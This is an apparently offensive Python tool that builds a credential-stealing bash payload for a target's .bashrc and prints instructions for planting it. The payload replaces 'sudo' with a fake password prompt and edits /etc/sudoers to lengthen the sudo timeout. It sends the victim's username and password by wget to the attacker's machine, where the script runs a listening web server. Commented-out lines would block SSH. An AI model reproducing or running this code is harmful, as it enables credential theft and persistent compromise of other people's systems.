import os
import subprocess as s
import sys

def main():
	#This function creates a script that edits .bashrc
	#on a target box once run on it so that anytime
	#someone uses the 'sudo' command, it sends an http
	#request to a server that is also hosted on the attacking
	#box with the username and password

	#Printing notice
	input("[!] THIS SHOULD BE RUN ON ATTACKING MACHINE(hit enter to continue)")
	file = False
	filename = "payload.txt"
	if(len(sys.argv) > 1 and sys.argv[1] == "-f"):
		file = True
		filename = sys.argv[2]
	
	#Grabbing ip of attacking box
	ip = s.getoutput("hostname -I")
	print("[*] Hosting web server on: " + str(ip))

	#Create sell script to be put on target box
	if(file == True):
		print("[*] Output file: .bashhrc")
	if os.path.exists(filename):
		os.remove(filename)
	f = open(filename, "x")
	
	#Defining function and storing originial sudo path 
	f.write('function sudo(){\norigsudo="$(which sudo)";\n')

	#Giving prompt and storing password in pw var
	f.write('read -s -p "[sudo] password for $USER: " pw;printf "\\n";\n')

	#Editing sudo timeout
	f.write("$origsudo sed -i 's/env_reset/env_reset, timestamp_timeout=75/' /etc/sudoers;\n")

	#Creating web request
	f.write('wget "')
	f.write(str(ip))
	f.write('/$USER:$pw" > /dev/null 2>&1;\n')

	#Blocking SSH
	#f.write("$origsudo iptables -A INPUT -p tcp --dport 22 -j DROP;\n")
	#f.write("$origsudo iptables -A OUTPUT -p tcp --dport 22 -j DROP;\n")

	#Executing original command
	f.write("$origsudo $@;\n")
	
	#Closing function and file
	f.write("}\n")
	f.close()

	#Printing user instructions
	print("[!] INSTRUCTIONS:")
	if(file == True):
		print("[!]\t1. Copy contents of " + filename + " in this directory")	
	else:
		print("[!]\t1. Copy payload below")
	print("[!]\t2. Paste at end of .bashrc file on TARGET machine")
	print("[!]\t3. Run '. ~/.bashrc'")

	if(file == False):
		print("[+] PAYLOAD:")
		os.system("cat " + filename)
		os.system("rm " + filename)

	print("[*] Starting Web Server to listen for credentials...")

	#Starting up web server to recieve credentials
	os.system("sudo python3 -m http.server 80 --bind " + ip)


main()
